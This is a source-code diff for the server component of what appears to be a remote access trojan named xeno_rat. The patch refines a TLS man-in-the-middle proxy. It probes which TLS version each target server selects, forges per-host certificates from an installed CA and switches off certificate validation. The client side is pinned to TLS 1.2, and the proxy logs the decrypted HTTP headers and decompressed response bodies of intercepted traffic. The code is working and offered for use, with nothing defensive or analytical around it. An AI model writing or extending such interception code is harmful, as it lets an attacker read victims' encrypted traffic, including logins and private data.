@@ -24,6 +24,7 @@ using System.Security.Authentication;
 using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
+using System.Text.RegularExpressions;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
@@ -265,11 +266,18 @@ namespace xeno_rat_server.Forms
             }
         }
 
-        // It is a pure TCP tunnel that relays raw bytes both directions.
-        // clientStream can be a PrependStream so the initial ClientHello bytes are replayed.
-        // Transparent TCP tunnel that writes optionally supplied prefix bytes (ClientHello) to upstream once
+        // ----------------------------------------------------------------------
+        // Transparent fallback that replays prefixBytes to upstream when present.
+        // This is similar to FallbackTransparent/TransparentTcpTunnel variants you already
+        // used — include/replace with your existing implementation if you have one.
+        // ----------------------------------------------------------------------
         private async Task TransparentTcpTunnel(Stream clientStream, string host, int port, CancellationToken ct)
         {
+            // If clientStream is a PrependStream it will replay the captured bytes automatically.
+            Stream streamForClient = clientStream;
+            var ps = clientStream as PrependStream;
+            if (ps != null) streamForClient = ps; // keep as is (it replays prefix)
+
             TcpClient upstream = null;
             NetworkStream upStream = null;
             try
@@ -281,20 +289,20 @@ namespace xeno_rat_server.Forms
             catch (Exception ex)
             {
                 PostUi($"Transparent tunnel connect to {host}:{port} failed: {ex.Message}");
-                try { clientStream?.Close(); } catch { }
+                try { streamForClient?.Close(); } catch { }
                 try { upstream?.Close(); } catch { }
                 return;
             }
 
             var linked = CancellationTokenSource.CreateLinkedTokenSource(ct);
-            var t1 = RelayStreamAsync(clientStream, upStream, linked.Token);
-            var t2 = RelayStreamAsync(upStream, clientStream, linked.Token);
+            var t1 = RelayStreamAsync(streamForClient, upStream, linked.Token);
+            var t2 = RelayStreamAsync(upStream, streamForClient, linked.Token);
             await Task.WhenAny(t1, t2).ConfigureAwait(false);
             try { linked.Cancel(); } catch { }
             try { await Task.WhenAll(t1, t2).ConfigureAwait(false); } catch { }
             try { upStream?.Close(); } catch { }
             try { upstream?.Close(); } catch { }
-            try { clientStream?.Close(); } catch { }
+            try { streamForClient?.Close(); } catch { }
         }
 
 
@@ -337,6 +345,83 @@ namespace xeno_rat_server.Forms
             }
         }
 
+        // ----------------------------------------------------------------------
+        // Probe helper: attempts TLS1.3 then TLS1.2 handshakes and returns the
+        // protocol the server actually negotiated, or SslProtocols.None on failure.
+        // ----------------------------------------------------------------------
+        private async Task<SslProtocols> ProbeUpstreamAsync(string host, int port, int timeoutMs = 3000)
+        {
+            if (string.IsNullOrEmpty(host)) throw new ArgumentNullException(nameof(host));
+
+            // Try a handshake with the given protocol. Return the negotiated protocol or None.
+            async Task<SslProtocols> TryHandshake(SslProtocols protocol)
+            {
+                TcpClient tcp = null;
+                SslStream ssl = null;
+                try
+                {
+                    tcp = new TcpClient();
+
+                    var connectTask = tcp.ConnectAsync(host, port);
+                    var winner = await Task.WhenAny(connectTask, Task.Delay(timeoutMs)).ConfigureAwait(false);
+                    if (winner != connectTask)
+                    {
+                        try { tcp?.Close(); } catch { }
+                        return SslProtocols.None;
+                    }
+
+                    var net = tcp.GetStream();
+                    ssl = new SslStream(net, leaveInnerStreamOpen: false,
+                        userCertificateValidationCallback: (sender, cert, chain, errors) => true);
+
+                    var authTask = ssl.AuthenticateAsClientAsync(host, null, protocol, checkCertificateRevocation: false);
+                    var authWinner = await Task.WhenAny(authTask, Task.Delay(timeoutMs)).ConfigureAwait(false);
+                    if (authWinner != authTask)
+                    {
+                        try { ssl?.Close(); } catch { }
+                        try { tcp?.Close(); } catch { }
+                        return SslProtocols.None;
+                    }
+
+                    // If handshake succeeded, return negotiated protocol
+                    return ssl.SslProtocol;
+                }
+                catch
+                {
+                    return SslProtocols.None;
+                }
+                finally
+                {
+                    try { ssl?.Close(); } catch { }
+                    try { tcp?.Close(); } catch { }
+                }
+            }
+
+            // 1) Try TLS1.3 first (if runtime supports it).
+            try
+            {
+                var p13 = await TryHandshake(SslProtocols.Tls13).ConfigureAwait(false);
+                if (p13 == SslProtocols.Tls13) return SslProtocols.Tls13;
+                if (p13 == SslProtocols.Tls12) return SslProtocols.Tls12; // runtime negotiated 1.2 even though 1.3 was requested
+            }
+            catch { /* ignore */ }
+
+            // 2) Try TLS1.2
+            try
+            {
+                var p12 = await TryHandshake(SslProtocols.Tls12).ConfigureAwait(false);
+                if (p12 == SslProtocols.Tls12) return SslProtocols.Tls12;
+            }
+            catch { /* ignore */ }
+
+            // 3) Unknown / failed
+            return SslProtocols.None;
+        }
+
+        // ----------------------------------------------------------------------
+        // Relay loop that decides MITM vs transparent. Caller reads ClientHello,
+        // probes upstream, then either calls HandleMitmAsync or does transparent.
+        // ----------------------------------------------------------------------
         private async Task RelayLoopWithOptionalMitm(Socket clientSock, string destHost, int destPort, ListViewItem lvi, X509Certificate2 caPfx, bool enableMitm = true)
         {
             Action<string> PostUiLocal = (s) =>
@@ -356,7 +441,6 @@ namespace xeno_rat_server.Forms
 
             if (enableMitm && destPort == 443 && caPfx != null && caPfx.HasPrivateKey)
             {
-                // 1) Read ClientHello once
                 byte[] hello = null;
                 try
                 {
@@ -372,70 +456,30 @@ namespace xeno_rat_server.Forms
                 string sni = TryParseSniFromClientHello(hello) ?? destHost;
                 PostUiLocal($"ClientHello SNI parsed: {sni}");
 
-                // 2) Inspect client hello to see if the client advertises TLS1.3
-                bool clientAdvertisesTls13 = false;
+                // Quick heuristic whether client advertises TLS1.3 (optional)
+                bool clientAdvertsTls13 = false;
                 try
                 {
-                    // Simple heuristic: look for TLS 1.3 supported_versions extension (0x2b) and value 0x0304 in ClientHello extensions.
-                    // Reuse the helper you already had for parsing SNI - but here do a quick check.
-                    // We'll scan for bytes sequence 03 04 in supported_versions area — this is a heuristic but works for modern CHs.
-                    // A conservative approach: parse supported_versions extension (0x2b) if you already have such a parser; here a quick search:
                     if (hello != null && hello.Length > 0)
                     {
-                        // Cheap check: if bytes "03 04" appear in the ClientHello extension area after the handshake header,
-                        // then client likely advertises TLS1.3. (This is heuristic and acceptable here.)
                         for (int i = 0; i + 1 < hello.Length; i++)
                         {
-                            if (hello[i] == 0x03 && hello[i + 1] == 0x04) { clientAdvertisesTls13 = true; break; }
+                            if (hello[i] == 0x03 && hello[i + 1] == 0x04) { clientAdvertsTls13 = true; break; }
                         }
                     }
                 }
-                catch { clientAdvertisesTls13 = false; }
+                catch { clientAdvertsTls13 = false; }
+                PostUiLocal($"Client advertises TLS1.3: {clientAdvertsTls13}");
 
-                PostUiLocal($"Client advertises TLS1.3: {clientAdvertisesTls13}");
-
-                // 3) Probe upstream server to see what protocol it actually selects.
-                //    We'll connect and do an AuthenticateAsClientAsync, then read remoteSsl.SslProtocol.
-                //    Use a small timeout to avoid long delays.
+                // Probe upstream
                 SslProtocols serverSelectedProtocol = SslProtocols.None;
                 try
                 {
-                    using (var probe = new TcpClient())
-                    {
-                        var probeConnect = probe.ConnectAsync(sni, 443);
-                        var probeTimeout = Task.Delay(3000);
-                        var winner = await Task.WhenAny(probeConnect, probeTimeout).ConfigureAwait(false);
-                        if (winner != probeConnect)
-                        {
-                            PostUiLocal($"Upstream probe connect to {sni}: timeout.");
-                            // treat as failure -> fallback transparent
-                            serverSelectedProtocol = SslProtocols.None;
-                        }
-                        else
-                        {
-                            var probeNs = probe.GetStream();
-                            using (var probeSsl = new SslStream(probeNs, leaveInnerStreamOpen: false,
-                                userCertificateValidationCallback: (sender, cert, chain, errors) => true))
-                            {
-                                // Allow both TLS1.2 and TLS1.3 so we learn what server actually chooses
-                                var authTask = probeSsl.AuthenticateAsClientAsync(sni, null, SslProtocols.Tls12 | SslProtocols.Tls13, checkCertificateRevocation: false);
-                                var authTimeout = Task.Delay(3000);
-                                var authWinner = await Task.WhenAny(authTask, authTimeout).ConfigureAwait(false);
-                                if (authWinner != authTask)
-                                {
-                                    PostUiLocal($"Upstream probe handshake with {sni}: timeout.");
-                                    serverSelectedProtocol = SslProtocols.None;
-                                }
-                                else
-                                {
-                                    // handshake completed
-                                    serverSelectedProtocol = probeSsl.SslProtocol;
-                                    PostUiLocal($"Upstream negotiated protocol for {sni}: {serverSelectedProtocol}");
-                                }
-                            }
-                            try { probe.Close(); } catch { }
-                        }
-                    }
+                    serverSelectedProtocol = await ProbeUpstreamAsync(sni, 443, 3000).ConfigureAwait(false);
+                    if (serverSelectedProtocol == SslProtocols.None)
+                        PostUiLocal($"Upstream probe to {sni}: inconclusive.");
+                    else
+                        PostUiLocal($"Upstream negotiated protocol for {sni}: {serverSelectedProtocol}");
                 }
                 catch (Exception ex)
                 {
@@ -443,39 +487,28 @@ namespace xeno_rat_server.Forms
                     serverSelectedProtocol = SslProtocols.None;
                 }
 
-                // 4) Decide: if server selected TLS1.3 -> skip MITM (transparent). If server selected TLS1.2 (or probe indicates TLS1.2), perform MITM.
-                // If the probe failed (serverSelectedProtocol == None), be conservative: try transparent fallback.
-                if (serverSelectedProtocol == SslProtocols.Tls12 || serverSelectedProtocol == SslProtocols.Tls13)
+                // Make decision
+                if (serverSelectedProtocol == SslProtocols.Tls13)
                 {
                     PostUiLocal($"Server selected TLS1.3 for {sni}; skipping MITM and using transparent tunnel.");
-                    // Re-play ClientHello to upstream in TransparentTcpTunnel; pass the 'hello' bytes so upstream sees them.
                     using (var prepend = new PrependStream(hello ?? new byte[0], clientNetStream, PostUiLocal))
                     {
                         await TransparentTcpTunnel(prepend, sni, 443, CancellationToken.None).ConfigureAwait(false);
                     }
                     return;
                 }
-                else if (serverSelectedProtocol <= SslProtocols.Tls11)
+                else if (serverSelectedProtocol == SslProtocols.Tls12)
                 {
-                    PostUiLocal($"Server selected TLS1.2 for {sni}; proceeding with MITM.");
+                    PostUiLocal($"Server selected TLS1.2 for {sni}; attempting MITM.");
                     using (var prepend = new PrependStream(hello ?? new byte[0], clientNetStream, PostUiLocal))
                     {
                         if (_mitmHandler != null)
                         {
-                            try
-                            {
-                                // call mitm handler; pass the original client hello as prefixBytes
-                                await _mitmHandler.HandleMitmAsync(prepend, sni, hello, CancellationToken.None).ConfigureAwait(false);
-                            }
-                            catch (Exception ex)
-                            {
-                                PostUiLocal($"MITM handler threw: {ex.Message}. Falling back to transparent tunnel.");
-                                await TransparentTcpTunnel(prepend, sni, 443, CancellationToken.None).ConfigureAwait(false);
-                            }
+                            // Call mitm handler; pass the probed serverSelectedProtocol
+                            await _mitmHandler.HandleMitmAsync(prepend, sni, hello, serverSelectedProtocol, CancellationToken.None).ConfigureAwait(false);
                         }
                         else
                         {
-                            // no mitm available -> transparent
                             await TransparentTcpTunnel(prepend, sni, 443, CancellationToken.None).ConfigureAwait(false);
                         }
                     }
@@ -483,8 +516,7 @@ namespace xeno_rat_server.Forms
                 }
                 else
                 {
-                    // Probe failed or unknown; fallback to transparent tunnel (safe choice)
-                    PostUiLocal($"Upstream probe did not determine server protocol for {sni}; falling back to transparent tunnel.");
+                    PostUiLocal($"Upstream probe inconclusive for {sni}; falling back to transparent tunnel.");
                     using (var prepend = new PrependStream(hello ?? new byte[0], clientNetStream, PostUiLocal))
                     {
                         await TransparentTcpTunnel(prepend, sni, 443, CancellationToken.None).ConfigureAwait(false);
@@ -493,7 +525,7 @@ namespace xeno_rat_server.Forms
                 }
             }
 
-            // Non-MITM path: plain TCP relay to remote
+            // Non-MITM flow: plain TCP relay
             TcpClient remote = new TcpClient();
             try
             {
@@ -648,20 +680,21 @@ namespace xeno_rat_server.Forms
                     return n;
                 }
 
-                if (!_inner.CanRead)
-                {
-                    _log("PrependStream inner not readable.");
-                    return 0;
-                }
+                if (!_inner.CanRead) return 0;
 
                 try
                 {
                     return _inner.Read(buffer, offset, count);
                 }
+                catch (IOException ioEx)
+                {
+                    _log("PrependStream inner read failed: " + ioEx.Message);
+                    return 0; // treat as EOF so caller can shutdown gracefully
+                }
                 catch (Exception ex)
                 {
                     _log("PrependStream inner read failed: " + ex.Message);
-                    throw;
+                    return 0;
                 }
             }
 
@@ -675,20 +708,22 @@ namespace xeno_rat_server.Forms
                     return n;
                 }
 
-                if (!_inner.CanRead)
-                {
-                    _log("PrependStream inner not readable (async).");
-                    return 0;
-                }
+                if (!_inner.CanRead) return 0;
 
                 try
                 {
                     return await _inner.ReadAsync(buffer, offset, count, cancellationToken).ConfigureAwait(false);
                 }
+                catch (IOException ioEx)
+                {
+                    _log("PrependStream inner read failed (async): " + ioEx.Message);
+                    return 0;
+                }
+                catch (OperationCanceledException) { return 0; }
                 catch (Exception ex)
                 {
                     _log("PrependStream inner read failed (async): " + ex.Message);
-                    throw;
+                    return 0;
                 }
             }
 
@@ -1774,59 +1809,15 @@ namespace xeno_rat_server.Forms
                 _transparentFallback = transparentTunnelFallback;
             }
 
-            // When MITM fails
-            private async Task FallbackTransparent(Stream clientCombinedStream, string host, int port, byte[] prefixBytes, CancellationToken ct)
+            // Transparent fallback wrapper that accepts prefix bytes explicitly
+            private async Task FallbackTransparent(Stream clientStream, string host, int port, byte[] prefixBytes, CancellationToken ct)
             {
-                // If the provided stream is a PrependStream, get the inner (original) stream to avoid replay issues.
-                Stream clientStream = clientCombinedStream;
-                var ps = clientCombinedStream as PrependStream;
-                if (ps != null)
-                {
-                    clientStream = ps.InnerStream;
-                }
+                Stream streamToUse = clientStream;
+                if (!(clientStream is PrependStream) && (prefixBytes != null && prefixBytes.Length > 0))
+                    streamToUse = new PrependStream(prefixBytes, clientStream, _log);
 
-                TcpClient upstream = null;
-                NetworkStream upStream = null;
-                try
-                {
-                    upstream = new TcpClient();
-                    await upstream.ConnectAsync(host, port).ConfigureAwait(false);
-                    upStream = upstream.GetStream();
-
-                    // If we captured a ClientHello, write it once to the upstream before piping.
-                    if (prefixBytes != null && prefixBytes.Length > 0)
-                    {
-                        try
-                        {
-                            await upStream.WriteAsync(prefixBytes, 0, prefixBytes.Length, ct).ConfigureAwait(false);
-                            await upStream.FlushAsync(ct).ConfigureAwait(false);
-                        }
-                        catch (Exception ex)
-                        {
-                            _log($"Failed to send prefix to upstream {host}:{port}: {ex.Message}");
-                            // proceed — if prefix failed, continue with raw relay
-                        }
-                    }
-                }
-                catch (Exception ex)
-                {
-                    _log($"Transparent tunnel connect to {host}:{port} failed: {ex.Message}");
-                    try { clientStream?.Close(); } catch { }
-                    try { upstream?.Close(); } catch { }
-                    return;
-                }
-
-                var linked = CancellationTokenSource.CreateLinkedTokenSource(ct);
-                var t1 = RelayStreamAsync(clientStream, upStream, linked.Token);
-                var t2 = RelayStreamAsync(upStream, clientStream, linked.Token);
-                await Task.WhenAny(t1, t2).ConfigureAwait(false);
-                try { linked.Cancel(); } catch { }
-                try { await Task.WhenAll(t1, t2).ConfigureAwait(false); } catch { }
-                try { upStream?.Close(); } catch { }
-                try { upstream?.Close(); } catch { }
-                try { clientStream?.Close(); } catch { }
+                await this.form.TransparentTcpTunnel(streamToUse, host, port, ct).ConfigureAwait(false);
             }
-
 
             public void Dispose()
             {
@@ -1843,7 +1834,6 @@ namespace xeno_rat_server.Forms
             /// </summary>
             private static bool ClientHelloIndicatesTls13(byte[] hello)
             {
-                return true; // remove when you fix MiTM in TLS 1.2
                 if (hello == null || hello.Length < 5) return false;
 
                 try
@@ -1912,100 +1902,55 @@ namespace xeno_rat_server.Forms
                 return false;
             }
 
-            // HandleMitmAsync will inspect prefixBytes (ClientHello), detect TLS1.3,
-            // and fallback to transparent tunnel immediately for TLS1.3 clients.
-            public async Task HandleMitmAsync(Stream clientCombinedStream, string sniHost, byte[] prefixBytes = null, CancellationToken ct = default)
+            // ----------------------------------------------------------------------
+            // MITM handler (caller has probed and passes the serverSelectedProtocol).
+            // If serverSelectedProtocol == Tls13 => it will fallback to transparent.
+            // prefixBytes: the captured ClientHello (so fallback can replay it).
+            // ----------------------------------------------------------------------
+            public async Task HandleMitmAsync(Stream clientCombinedStream, string sniHost, byte[] prefixBytes, SslProtocols probedProtocol, CancellationToken ct = default)
             {
                 if (clientCombinedStream == null) throw new ArgumentNullException(nameof(clientCombinedStream));
                 if (string.IsNullOrEmpty(sniHost)) sniHost = "localhost";
 
-                // 0) Helper to unwrap PrependStream if fallback needs raw inner stream
-                Stream UnwrapStream(Stream s)
+                // helper to unwrap PrependStream if fallback needs the raw inner stream
+                Stream UnwrapIfPrepend(Stream s)
                 {
                     var ps = s as PrependStream;
                     return ps != null ? ps.InnerStream : s;
                 }
 
-                // 1) Probe upstream to learn which protocol server picks.
-                //    We'll attempt to create an upstream SslStream first (so server chooses)
-                TcpClient probeTcp = null;
-                SslStream probeSsl = null;
-                SslProtocols upstreamProtocol = SslProtocols.None;
-                try
-                {
-                    probeTcp = new TcpClient();
-                    await probeTcp.ConnectAsync(sniHost, 443).ConfigureAwait(false);
-                    var probeNet = probeTcp.GetStream();
-
-                    // Authenticate to upstream (allow both TLS12 and TLS13 where platform supports it)
-                    probeSsl = new SslStream(probeNet, leaveInnerStreamOpen: false, userCertificateValidationCallback: (a, b, c, d) => true);
-                    try
-                    {
-                        // Request TLS1.2 | TLS1.3 (if platform supports). If TLS1.3 not supported by runtime, this will effectively request TLS1.2.
-                        await probeSsl.AuthenticateAsClientAsync(sniHost, null, SslProtocols.Tls12 | SslProtocols.Tls13, checkCertificateRevocation: false).ConfigureAwait(false);
-                        upstreamProtocol = probeSsl.SslProtocol;
-                    }
-                    catch (Exception probeEx)
-                    {
-                        // If probe fails, log and fall back to transparent tunnel now.
-                        _log($"Upstream probe to {sniHost} failed: {probeEx.Message}");
-                        try { probeSsl?.Close(); } catch { }
-                        try { probeTcp?.Close(); } catch { }
-
-                        // fallback transparent (unwrap raw client stream)
-                        await FallbackTransparent(UnwrapStream(clientCombinedStream), sniHost, 443, prefixBytes, ct).ConfigureAwait(false);
-                        return;
-                    }
-                }
-                catch (Exception ex)
-                {
-                    _log($"Failed to connect to upstream {sniHost} for probe: {ex.Message}");
-                    try { probeSsl?.Close(); } catch { }
-                    try { probeTcp?.Close(); } catch { }
-
-                    await FallbackTransparent(UnwrapStream(clientCombinedStream), sniHost, 443, prefixBytes, ct).ConfigureAwait(false);
-                    return;
-                }
-
-                // If server selected TLS1.3 -> skip MITM (transparent tunnel). TLS1.3 MITM is not implemented here.
-                if (upstreamProtocol == SslProtocols.Tls13)
+                // If server selected TLS1.3 we do not attempt MITM here
+                if (probedProtocol == SslProtocols.Tls13)
                 {
                     _log($"Upstream negotiated protocol for {sniHost}: Tls13. Skipping MITM and using transparent tunnel.");
-                    // probeSsl is an active SSL connection — we can't reuse it for a transparent raw tunnel.
-                    // Close probe connection and fall back to fresh transparent tunnel (writing prefix).
-                    try { probeSsl?.Close(); } catch { }
-                    try { probeTcp?.Close(); } catch { }
-
-                    await FallbackTransparent(UnwrapStream(clientCombinedStream), sniHost, 443, prefixBytes, ct).ConfigureAwait(false);
+                    await FallbackTransparent(UnwrapIfPrepend(clientCombinedStream), sniHost, 443, prefixBytes, ct).ConfigureAwait(false);
                     return;
                 }
 
-                // At this point server selected TLS1.2 (or lower) and probeSsl is an authenticated SslStream.
-                _log($"Upstream negotiated protocol for {sniHost}: {upstreamProtocol}. Proceeding with MITM.");
+                _log($"Upstream negotiated protocol for {sniHost}: {probedProtocol}. Proceeding with MITM.");
 
-                // 2) Create or get a leaf cert for this host
+                // Create/get leaf cert for the host (you must provide implementation)
                 X509Certificate2 leafCert;
                 try
                 {
-                    leafCert = GetOrCreateCertForHost(sniHost); // your existing method that returns cert imported with EphemeralKeySet
+                    // Implement/Get this function to create ephemeral certs (example existed in your code)
+                    leafCert = GetOrCreateCertForHost(sniHost);
+                    if (leafCert == null) throw new InvalidOperationException("GetOrCreateCertForHost returned null");
                 }
                 catch (Exception ex)
                 {
                     _log($"MITM failed creating cert for {sniHost}: {ex.Message}");
-                    try { probeSsl?.Close(); } catch { }
-                    try { probeTcp?.Close(); } catch { }
-                    await FallbackTransparent(UnwrapStream(clientCombinedStream), sniHost, 443, prefixBytes, ct).ConfigureAwait(false);
+                    await FallbackTransparent(UnwrapIfPrepend(clientCombinedStream), sniHost, 443, prefixBytes, ct).ConfigureAwait(false);
                     return;
                 }
 
-                // 3) Authenticate to the client using our forged leaf certificate.
-                //    IMPORTANT: do not write the client's ClientHello to upstream — client expects to perform TLS with us.
+                // Authenticate to client using forged leaf certificate. Limit to TLS1.2 for server-side.
                 SslStream clientSsl = null;
                 try
                 {
                     clientSsl = new SslStream(clientCombinedStream, leaveInnerStreamOpen: true);
                     await clientSsl.AuthenticateAsServerAsync(leafCert, clientCertificateRequired: false,
-                        enabledSslProtocols: SslProtocols.Tls11 /* limit to TLS1.2 for MITM stability */, checkCertificateRevocation: false).ConfigureAwait(false);
+                        enabledSslProtocols: SslProtocols.Tls12, checkCertificateRevocation: false).ConfigureAwait(false);
 
                     _log($"Authenticated to client for {sniHost}. Protocol: {clientSsl.SslProtocol}");
                 }
@@ -2013,35 +1958,23 @@ namespace xeno_rat_server.Forms
                 {
                     _log($"Failed to authenticate to client (MITM). Falling back to transparent tunnel: {ex.Message}");
                     try { clientSsl?.Dispose(); } catch { }
-                    try { probeSsl?.Close(); } catch { }
-                    try { probeTcp?.Close(); } catch { }
-
-                    await FallbackTransparent(UnwrapStream(clientCombinedStream), sniHost, 443, prefixBytes, ct).ConfigureAwait(false);
+                    await FallbackTransparent(UnwrapIfPrepend(clientCombinedStream), sniHost, 443, prefixBytes, ct).ConfigureAwait(false);
                     return;
                 }
 
-                // 4) We already have a probed upstream connection (probeSsl). Reuse it if still open.
+                // Connect to upstream fresh (do not replay ClientHello to upstream for MITM).
+                TcpClient remote = null;
                 SslStream remoteSsl = null;
-                TcpClient remoteTcp = null;
-                bool reusedProbe = false;
                 try
                 {
-                    if (probeSsl != null && probeTcp != null)
-                    {
-                        // Reuse the active probed SslStream as upstream
-                        remoteSsl = probeSsl;
-                        remoteTcp = probeTcp;
-                        reusedProbe = true;
-                    }
-                    else
-                    {
-                        // Shouldn't happen because we probed above, but create a fresh connection as fallback
-                        remoteTcp = new TcpClient();
-                        await remoteTcp.ConnectAsync(sniHost, 443).ConfigureAwait(false);
-                        var remoteNet = remoteTcp.GetStream();
-                        remoteSsl = new SslStream(remoteNet, leaveInnerStreamOpen: false, userCertificateValidationCallback: (a, b, c, d) => true);
-                        await remoteSsl.AuthenticateAsClientAsync(sniHost, null, SslProtocols.Tls13 | SslProtocols.Tls12, false).ConfigureAwait(false);
-                    }
+                    remote = new TcpClient();
+                    await remote.ConnectAsync(sniHost, 443).ConfigureAwait(false);
+                    var remoteNet = remote.GetStream();
+                    remoteSsl = new SslStream(remoteNet, leaveInnerStreamOpen: false,
+                        userCertificateValidationCallback: (sender, cert, chain, errors) => true);
+
+                    // Authenticate to upstream using TLS1.2 since serverSelectedProtocol indicated TLS1.2
+                    await remoteSsl.AuthenticateAsClientAsync(sniHost, null, SslProtocols.Tls12, checkCertificateRevocation: false).ConfigureAwait(false);
 
                     _log($"Connected to upstream {sniHost}. Protocol: {remoteSsl.SslProtocol}");
                 }
@@ -2049,34 +1982,62 @@ namespace xeno_rat_server.Forms
                 {
                     _log($"Failed to connect/authenticate to upstream {sniHost}: {ex.Message}");
                     try { remoteSsl?.Close(); } catch { }
-                    try { remoteTcp?.Close(); } catch { }
+                    try { remote?.Close(); } catch { }
                     try { clientSsl?.Close(); } catch { }
 
-                    await FallbackTransparent(UnwrapStream(clientCombinedStream), sniHost, 443, prefixBytes, ct).ConfigureAwait(false);
+                    await FallbackTransparent(UnwrapIfPrepend(clientCombinedStream), sniHost, 443, prefixBytes, ct).ConfigureAwait(false);
                     return;
                 }
 
-                // 5) Pipe plaintext between clientSsl <-> remoteSsl using your PipePlainAsync implementation
+                // Start two directional pipes and shut them down cleanly
                 var pipeCts = CancellationTokenSource.CreateLinkedTokenSource(ct);
                 Task t1 = null, t2 = null;
                 try
                 {
-                    t1 = PipePlainAsync(clientSsl, remoteSsl, pipeCts.Token, true);  // client -> server (requests)
-                    t2 = PipePlainAsync(remoteSsl, clientSsl, pipeCts.Token, false); // server -> client (responses)
+                    t1 = PipePlainAsync(clientSsl, remoteSsl, pipeCts.Token, true);  // client -> server
+                    t2 = PipePlainAsync(remoteSsl, clientSsl, pipeCts.Token, false); // server -> client
 
-                    await Task.WhenAny(t1, t2).ConfigureAwait(false);
+                    try
+                    {
+                        await Task.WhenAll(t1, t2).ConfigureAwait(false);
+                        _log("Both C->S and S->C pipes finished.");
+                    }
+                    catch (Exception ex)
+                    {
+                        _log($"Pipe orchestration error: {ex.Message}");
+                    }
+
+                    // give the other side a short moment (optional)
+                    // await Task.Delay(50).ConfigureAwait(false);
                 }
                 catch (Exception ex)
                 {
-                    _log($"MITM pipe error for {sniHost}: {ex.Message}");
+                    _log($"Pipe orchestration error: {ex.Message}");
                 }
                 finally
                 {
+                    // request both pipes to stop
                     try { pipeCts.Cancel(); } catch { }
-                    try { if (t1 != null) await Task.WhenAll(t1, t2).ConfigureAwait(false); } catch { }
+
+                    // wait for both to finish (observe exceptions and log them)
+                    try
+                    {
+                        if (t1 != null) await t1.ConfigureAwait(false);
+                    }
+                    catch (Exception ex) { _log($"Pipe t1 ended with: {ex.Message}"); }
+
+                    try
+                    {
+                        if (t2 != null) await t2.ConfigureAwait(false);
+                    }
+                    catch (Exception ex) { _log($"Pipe t2 ended with: {ex.Message}"); }
+
+                    // close SSL streams then underlying sockets — avoid closing underlying socket twice
                     try { clientSsl?.Close(); } catch { }
                     try { remoteSsl?.Close(); } catch { }
-                    try { if (!reusedProbe) remoteTcp?.Close(); else { /* probeTcp already closed by remoteSsl.Close() */ } } catch { }
+                    try { remote?.Close(); } catch { }
+
+                    try { pipeCts.Dispose(); } catch { }
                 }
             }
 
@@ -2135,75 +2096,110 @@ namespace xeno_rat_server.Forms
                 }
             }
 
-            // ------------------------
-            // Forward bytes between two streams
+            // It forwards live bytes to dst and accumulates raw response body bytes for logging after stream ends.
             private async Task PipePlainAsync(Stream src, Stream dst, CancellationToken ct, bool isRequest)
             {
-                var buf = new byte[16 * 1024];
+                const int BUF_SIZE = 16 * 1024;
+                var buf = new byte[BUF_SIZE];
+
+                MemoryStream headerBuf = new MemoryStream();
+                MemoryStream fullResponseBuf = new MemoryStream();
+                bool headerLogged = false;
+                bool isChunked = false;
+                string contentEncoding = null;
+
                 try
                 {
                     while (!ct.IsCancellationRequested)
                     {
-                        int read;
+                        int bytesRead;
                         try
                         {
-                            read = await src.ReadAsync(buf, 0, buf.Length, ct).ConfigureAwait(false);
+                            bytesRead = await src.ReadAsync(buf, 0, buf.Length, ct).ConfigureAwait(false);
                         }
                         catch (OperationCanceledException) { break; }
-                        catch { break; }
+                        catch (Exception ex)
+                        {
+                            _log($"Pipe {(isRequest ? "C->S" : "S->C")} read error: {ex.Message}");
+                            break;
+                        }
 
-                        if (read <= 0) break;
+                        if (bytesRead <= 0) break;
 
+                        // Always forward bytes to destination immediately
                         try
                         {
-                            await dst.WriteAsync(buf, 0, read, ct).ConfigureAwait(false);
+                            await dst.WriteAsync(buf, 0, bytesRead, ct).ConfigureAwait(false);
                             await dst.FlushAsync(ct).ConfigureAwait(false);
                         }
-                        catch { break; }
+                        catch (Exception ex)
+                        {
+                            _log($"Pipe {(isRequest ? "C->S" : "S->C")} write error: {ex.Message}");
+                            break;
+                        }
 
-                        // Optional: log each packet
-                        // string dir = isRequest ? "C->S" : "S->C";
-                        // _log($"{dir}: {read} bytes");
+                        // Capture headers first
+                        if (!headerLogged)
+                        {
+                            headerBuf.Write(buf, 0, bytesRead);
+                            string headersText = TryExtractHeaders(headerBuf.ToArray(), out int headersLength);
+                            if (headersText != null)
+                            {
+                                headerLogged = true;
+                                if (isRequest)
+                                    _log($"HTTP request detected:\n{Truncate(headersText, 1000)}");
+                                else
+                                    _log($"HTTP response detected:\n{Truncate(headersText, 1000)}");
+
+                                // Detect Transfer-Encoding and Content-Encoding
+                                isChunked = headersText.IndexOf("Transfer-Encoding: chunked", StringComparison.OrdinalIgnoreCase) >= 0;
+
+                                var match = Regex.Match(headersText, @"Content-Encoding:\s*(\S+)", RegexOptions.IgnoreCase);
+                                if (match.Success) contentEncoding = match.Groups[1].Value.ToLowerInvariant();
+                            }
+                        }
+
+                        // For responses, accumulate bytes for logging
+                        if (!isRequest)
+                        {
+                            fullResponseBuf.Write(buf, 0, bytesRead);
+                        }
                     }
-                }
-                catch { /* ignore */ }
-                finally
-                {
-                    try { await dst.FlushAsync(ct).ConfigureAwait(false); } catch { }
-                }
-            }
 
-            // Helper: copy loop (stream → stream) with cancellation
-            private async Task RelayStreamAsync(Stream src, Stream dst, CancellationToken ct)
-            {
-                var buf = new byte[16 * 1024];
-                try
-                {
-                    while (!ct.IsCancellationRequested)
+                    // After loop, decode & log body
+                    if (!isRequest && fullResponseBuf.Length > 0)
                     {
-                        int read = 0;
-                        try
+                        fullResponseBuf.Position = 0;
+                        Stream decodeStream = fullResponseBuf;
+
+                        // Wrap in decoder if needed
+                        if (!string.IsNullOrEmpty(contentEncoding))
                         {
-                            read = await src.ReadAsync(buf, 0, buf.Length, ct).ConfigureAwait(false);
-                        }
-                        catch (OperationCanceledException) { break; }
-                        catch (Exception ex)
-                        {
-                            _log("Relay read failed: " + ex.Message);
-                            break;
+                            try
+                            {
+                                if (contentEncoding == "gzip") decodeStream = new GZipStream(fullResponseBuf, CompressionMode.Decompress);
+                                else if (contentEncoding == "deflate") decodeStream = new DeflateStream(fullResponseBuf, CompressionMode.Decompress);
+                                else if (contentEncoding == "br") decodeStream = new BrotliStream(fullResponseBuf, CompressionMode.Decompress);
+                            }
+                            catch (Exception ex)
+                            {
+                                _log($"Failed to create decode stream for {contentEncoding}: {ex.Message}");
+                                decodeStream = fullResponseBuf; // fallback: raw bytes
+                            }
                         }
 
-                        if (read <= 0) break;
-
                         try
                         {
